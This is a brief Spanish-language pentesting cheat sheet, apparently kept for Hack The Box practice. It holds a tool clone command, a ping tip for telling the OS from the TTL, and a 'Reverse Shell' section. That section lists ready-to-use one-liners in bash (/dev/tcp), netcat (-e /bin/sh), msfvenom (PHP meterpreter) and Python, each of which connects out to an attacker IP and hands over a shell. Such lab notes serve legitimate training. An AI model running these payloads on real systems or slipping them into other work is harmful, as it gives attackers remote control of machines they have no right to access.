`git clone https://github.com/s4vitar/htbExplorer.git`
`chmod +x htbExplorer`

## Previa 
comando: **ping -c 1 ip**: Ver si hay conexion | flag `-R` ver lo que hace --> ttl= 64 (Linux) / 128 (win)


## Reverse Shell

**bash**: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
**netcat**: nc -e /bin/sh 10.0.0.1 1234
**php (metasplit)**: msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
**py** : python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'